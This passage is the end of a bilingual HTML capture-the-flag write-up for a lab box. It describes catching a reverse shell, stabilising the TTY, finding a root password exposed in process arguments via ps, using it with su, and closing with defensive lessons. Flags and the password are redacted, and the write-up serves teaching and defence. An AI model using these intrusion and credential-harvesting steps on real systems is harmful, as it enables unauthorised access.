+    <p data-it="Un dettaglio di metodo che vale la pena isolare: &lt;code&gt;check_output&lt;/code&gt; blocca finché il comando non termina e solleva un'eccezione se l'exit code è diverso da zero. Se il listener non è ancora in ascolto (o la porta è chiusa sulla VPN), &lt;code&gt;bash -c&lt;/code&gt; fallisce, l'eccezione risale e l'app risponde &lt;strong&gt;500&lt;/strong&gt; — nessuna shell. Per questo apro porta e listener &lt;em&gt;prima&lt;/em&gt; di inviare il payload; in scenari più fragili &lt;code&gt;os.system&lt;/code&gt; è più tollerante perché non solleva sul return code." data-en="A method detail worth isolating: &lt;code&gt;check_output&lt;/code&gt; blocks until the command finishes and raises an exception on a non-zero exit code. If the listener isn't up yet (or the port is closed on the VPN), &lt;code&gt;bash -c&lt;/code&gt; fails, the exception bubbles up and the app returns &lt;strong&gt;500&lt;/strong&gt; — no shell. That's why I open the port and listener &lt;em&gt;before&lt;/em&gt; sending the payload; in more fragile scenarios &lt;code&gt;os.system&lt;/code&gt; is more forgiving because it doesn't raise on the return code.">Un dettaglio di metodo che vale la pena isolare: <code>check_output</code> blocca finché il comando non termina e solleva un'eccezione se l'exit code è diverso da zero. Se il listener non è ancora in ascolto (o la porta è chiusa sulla VPN), <code>bash -c</code> fallisce, l'eccezione risale e l'app risponde <strong>500</strong> — nessuna shell. Per questo apro porta e listener <em>prima</em> di inviare il payload; in scenari più fragili <code>os.system</code> è più tollerante perché non solleva sul return code.</p>
+    <p data-it="Torna una shell come &lt;strong&gt;bartender&lt;/strong&gt;. È un po' zoppa (niente frecce, niente tab), quindi la stabilizzo e leggo la prima bandiera." data-en="A shell comes back as &lt;strong&gt;bartender&lt;/strong&gt;. It's a bit crippled (no arrow keys, no tab), so I stabilize it and read the first flag.">Torna una shell come <strong>bartender</strong>. È un po' zoppa (niente frecce, niente tab), quindi la stabilizzo e leggo la prima bandiera.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># TTY decente</span>
+<span class="neutral">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+<span class="comment"># Ctrl+Z</span>
+<span class="neutral">stty raw -echo; fg</span>
+<span class="neutral">export TERM=xterm</span>
+<span class="neutral">id            # uid=1000(bartender)</span>
+cat user.txt  # <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># a decent TTY</span>
+<span class="neutral">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+<span class="comment"># Ctrl+Z</span>
+<span class="neutral">stty raw -echo; fg</span>
+<span class="neutral">export TERM=xterm</span>
+<span class="neutral">id            # uid=1000(bartender)</span>
+cat user.txt  # <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+
+    <h2 data-it="[04] Privesc: il processo troppo loquace" data-en="[04] Privesc: the process that talks too much" id='root'>[04] Privesc: il processo troppo loquace</h2>
+    <p data-it="La root ha richiesto più scavo. Il trucco qui non è un exploit ma l'osservazione: cosa dicono ad alta voce i processi in esecuzione?" data-en="Root took more digging. The trick here isn't an exploit but observation: what do the running processes say out loud?">La root ha richiesto più scavo. Il trucco qui non è un exploit ma l'osservazione: cosa dicono ad alta voce i processi in esecuzione?</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># cosa dice ad alta voce un processo</span>
+<span class="neutral">ps aux | grep python</span>
+# bartender ... python3 app.py <span class="danger">--db-pass=████</span> ...
+<span class="neutral">su root</span>
+<span class="comment"># password: ████</span>
+cat /root/root.txt   # <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># what a process says out loud</span>
+<span class="neutral">ps aux | grep python</span>
+# bartender ... python3 app.py <span class="danger">--db-pass=████</span> ...
+<span class="neutral">su root</span>
+<span class="comment"># password: ████</span>
+cat /root/root.txt   # <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+    <p data-it="La lezione tecnica: gli argomenti di &lt;em&gt;qualsiasi&lt;/em&gt; processo sono leggibili da chiunque via &lt;code&gt;/proc/PID/cmdline&lt;/code&gt;, a meno che &lt;code&gt;/proc&lt;/code&gt; non sia montato con &lt;code&gt;hidepid&lt;/code&gt;. &lt;code&gt;ps aux | grep python&lt;/code&gt; è comodo ma restrittivo: una password passata come flag sulla command line è un segreto pubblico per &lt;em&gt;ogni&lt;/em&gt; utente sulla box, non solo per i processi python. Quando faccio enum privesc scorro sempre l'intera colonna COMMAND, non solo il grep che mi aspetto." data-en="The technical lesson: the arguments of &lt;em&gt;any&lt;/em&gt; process are readable by anyone via &lt;code&gt;/proc/PID/cmdline&lt;/code&gt;, unless &lt;code&gt;/proc&lt;/code&gt; is mounted with &lt;code&gt;hidepid&lt;/code&gt;. &lt;code&gt;ps aux | grep python&lt;/code&gt; is handy but narrow: a password passed as a flag on the command line is a public secret for &lt;em&gt;every&lt;/em&gt; user on the box, not just the python processes. When I enumerate for privesc I always scan the whole COMMAND column, not only the grep I expect to hit.">La lezione tecnica: gli argomenti di <em>qualsiasi</em> processo sono leggibili da chiunque via <code>/proc/PID/cmdline</code>, a meno che <code>/proc</code> non sia montato con <code>hidepid</code>. <code>ps aux | grep python</code> è comodo ma restrittivo: una password passata come flag sulla command line è un segreto pubblico per <em>ogni</em> utente sulla box, non solo per i processi python. Quando faccio enum privesc scorro sempre l'intera colonna COMMAND, non solo il grep che mi aspetto.</p>
+    <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
+    <div class="callout">
+      <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
+      <div class="code-block"><pre><span class="ok">THM{</span><span class="redaction" aria-label="flag oscurata">████████████████████</span><span class="ok">}</span></pre></div>
+      <p data-it="La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo &lt;code&gt;Enter&lt;/code&gt; lo batti tu." data-en="You won't find the flag here: the value itself teaches nothing, and half the fun is getting there. The methodology above is complete and reproducible — the last &lt;code&gt;Enter&lt;/code&gt; is yours to press.">La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo <code>Enter</code> lo batti tu.</p>
+    </div>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// lezione" data-en="// lesson">// lezione</div>
+  <p data-it="Due difese concrete. Uno: nel parsing usa sempre &lt;code&gt;yaml.safe_load()&lt;/code&gt; — e in generale non deserializzare da input non fidato formati che ricostruiscono oggetti. Due: le password non vanno &lt;em&gt;mai&lt;/em&gt; passate come argomenti CLI; usa variabili d'ambiente, file di config con permessi stretti o un secret manager, e valuta &lt;code&gt;hidepid&lt;/code&gt; su &lt;code&gt;/proc&lt;/code&gt;. E già che ci sei: togli login demo e commenti dal sorgente prima del «soft opening»." data-en="Two concrete defenses. One: always parse with &lt;code&gt;yaml.safe_load()&lt;/code&gt; — and more broadly, don't deserialize object-reconstructing formats from untrusted input. Two: passwords must &lt;em&gt;never&lt;/em&gt; be passed as CLI arguments; use environment variables, config files with tight permissions or a secret manager, and consider &lt;code&gt;hidepid&lt;/code&gt; on &lt;code&gt;/proc&lt;/code&gt;. And while you're at it: strip demo logins and comments from the source before the &quot;soft opening&quot;.">Due difese concrete. Uno: nel parsing usa sempre <code>yaml.safe_load()</code> — e in generale non deserializzare da input non fidato formati che ricostruiscono oggetti. Due: le password non vanno <em>mai</em> passate come argomenti CLI; usa variabili d'ambiente, file di config con permessi stretti o un secret manager, e valuta <code>hidepid</code> su <code>/proc</code>. E già che ci sei: togli login demo e commenti dal sorgente prima del «soft opening».</p>
+</div>
+
+  </div><!-- /article-body -->
+  </article>
+  </main>
+
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fbeach-bar%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fbeach-bar%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <button class="share-btn" onclick="copyLink(this)" data-it="copia link" data-en="copy link">copia link</button>
+    </div>
+  </div>
+
+  <aside class="author-box">
+    <span class="ab-label" data-it="// L'autore" data-en="// The author">// L'autore</span>
+    <div class="ab-name">Paolo Costanzo</div>
+    <div class="ab-role" data-it="Ricercatore indipendente di sicurezza · Co-Founder &amp;amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte" data-en="Independent Security Researcher · Co-Founder &amp;amp; CEO @ CoDe RTD · Professor of Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte">Ricercatore indipendente di sicurezza · Co-Founder &amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp; AWS @ ITS ICT Piemonte</div>
+    <p class="ab-bio" data-it="Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile." data-en="Independent research on cloud security, agentic AI systems, threat intelligence, networks and authorized offensive validation. Every report states its methodology, limitations and sources, and is reproducible where possible.">Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile.</p>
+    <div class="ab-links">
+      <a class="ab-cta" data-it="Scrivimi →" data-en="Get in touch →" href="mailto:me@paolocostanzo.com">Scrivimi →</a>
+      <a href="https://www.paolocostanzo.com" target="_blank" rel="noopener noreferrer">paolocostanzo.com</a>
+      <a href="https://www.linkedin.com/in/paolocostanzoit/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+      <a href="https://github.com/paolocostanzo" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </aside>
+  <div class="article-footer">
+    <a data-it="← tutti i writeup dell'evento" data-en="← all event writeups" href="/ctf/hacker-holidays-2026/">← tutti i writeup dell'evento</a>
+    <span class="footer-copy" data-it="© 2026 NonèCostanzo — lab autorizzato, per scopi educativi" data-en="© 2026 NonèCostanzo — authorised lab, for educational purposes">© 2026 NonèCostanzo — lab autorizzato, per scopi educativi</span>
+  </div>
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+  <script>
+    function setLang(lang){
+      document.querySelectorAll('[data-'+lang+']').forEach(el=>{const val=el.getAttribute('data-'+lang);
+        if(el.tagName==='META'){el.setAttribute('content',val);}else if(el.tagName==='TITLE'){document.title=val;}else{el.innerHTML=val;}});
+      document.documentElement.lang=lang;
+      document.querySelectorAll('.lang-btn').forEach(b=>{const on=b.textContent.toLowerCase()===lang;b.classList.toggle('active',on);b.setAttribute('aria-pressed',on);});
+      document.querySelectorAll('.lang-it').forEach(el=>el.style.display=lang==='en'?'none':'');
+      document.querySelectorAll('.lang-en').forEach(el=>el.style.display=lang==='en'?'block':'none');
+      localStorage.setItem('lang',lang);
+    }
+    function copyLink(btn){const en=document.documentElement.lang==='en';
+      navigator.clipboard.writeText(window.location.href).then(()=>{btn.textContent=en?'copied ✓':'copiato ✓';btn.classList.add('ok');
+      setTimeout(()=>{btn.textContent=en?'copy link':'copia link';btn.classList.remove('ok');},2000);});}
+    const s=localStorage.getItem('lang'); if(s&&s!=='it')setLang(s);
+    const bar=document.getElementById('read-bar'),bt=document.getElementById('back-top');
+    window.addEventListener('scroll',()=>{const h=document.documentElement;bar.style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';bt.classList.toggle('vis',h.scrollTop>400);},{passive:true});
+  </script>
+</body>
+</html>
